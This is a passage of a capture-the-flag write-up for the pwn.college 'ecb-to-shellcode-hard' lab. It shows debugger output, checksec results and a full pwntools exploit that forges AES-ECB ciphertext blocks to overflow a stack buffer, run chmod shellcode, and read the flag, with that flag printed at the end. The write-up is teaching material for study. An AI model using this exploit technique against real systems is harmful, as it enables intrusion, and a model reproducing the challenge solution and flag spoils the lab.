+Stack level 0, frame at 0x7fffffffe5d0:
+ rip = 0x4016d3 in challenge; saved rip = 0x401786
+ called by frame at 0x7fffffffe600
+ Arglist at 0x7fffffffe5c0, args: 
+ Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
+ Saved registers:
+  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
+```
+
+- [x] Location of the buffer: `0x7fffffffe570`
+- [x] Location of the saved return pointer to `main()`: `0x7fffffffe5c8`
+
+### Exploit
+
+Let's if the `/challenge/vulnerable-overflow` binary is PIE.
+
+```
+hacker@integrated-security~ecb-to-shellcode-hard:~$ checksec /challenge/vulnerable-overflow 
+[*] '/challenge/vulnerable-overflow'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ ln -sf /flag ~/Z
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+# Initialize values
+buffer_addr = 0x7fffffffe570
+addr_of_saved_ip = 0x7fffffffe5c8 
+shellcode_addr = buffer_addr
+
+def get_encrypted_block(payload_bytes):
+    """
+    Interacts with the AES-ECB encryption oracle (dispatcher).
+    Returns the raw ciphertext generated using the hidden system key.
+    """
+    io = process('/challenge/dispatch', level='error')
+    io.send(payload_bytes) 
+    ciphertext = io.readall()
+    io.close()
+    return ciphertext
+
+print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")
+
+# Block 1 - "VERIFIED" header and length (16 bytes)
+sample_cipher = get_encrypted_block(b"A")
+header_block = sample_cipher[0:16]
+
+# Block 2 - Shellcode
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+shellcode = asm(shellcode_asm).ljust(16, b'\x90')
+shellcode_cipher = get_encrypted_block(shellcode)
+shellcode_block = shellcode_cipher[16:32]
+
+# Block 2-6 - Padding chain
+padding_harvest = get_encrypted_block(b"B" * 16)
+padding_block = padding_harvest[16:32]
+# Since this time the buffer_addr signifies the address of plaintext, and not plaintext.mesage, we have to subtract 16 bytes (8 for plaintext.header, 8 for plaintext.length)
+padding_blocks = padding_block * ((addr_of_saved_ip - buffer_addr - 16) // 16)
+
+# Block 7 - Return address overwrite
+shellcode_addr_block = b"C" * 8 
+shellcode_addr_block += p64(shellcode_addr)
+return_addr_cipher = get_encrypted_block(shellcode_addr_block)
+return_address_block = return_addr_cipher[16:32]
+
+# Block 8 - PKCS7 padding
+pkcs_padding_suffix = sample_cipher[-16:]
+
+# Craft payload
+payload = header_block 
+payload += shellcode_block
+payload += padding_blocks
+payload += return_address_block 
+payload += pkcs_padding_suffix
+
+# Pass payload
+print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
+p = process('/challenge/vulnerable-overflow')
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (128 bytes) to target...
+Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCp\xe5\xff\xff\xff\x7f!
+$  
+```
+
+```
+hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ cat ~/Z
+pwn.college{practice}
+```
+
+The same script will work in the non-practice mode as the binary is non-PIE.
+
+```
+hacker@integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
+[*] Harvesting ciphertext blocks from the ECB encryption oracle...
+[*] Dispatching assembled ciphertext (128 bytes) to target...
+Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCp\xe5\xff\xff\xff\x7f!
+$
+```
+
+```
+hacker@integrated-security~ecb-to-shellcode-hard:~$ cat ~/Z
+pwn.college{wmHupm0Wp3hQROeesdi06fN4QYC.QXwYDMxEDL4ITM0EzW}
 ```
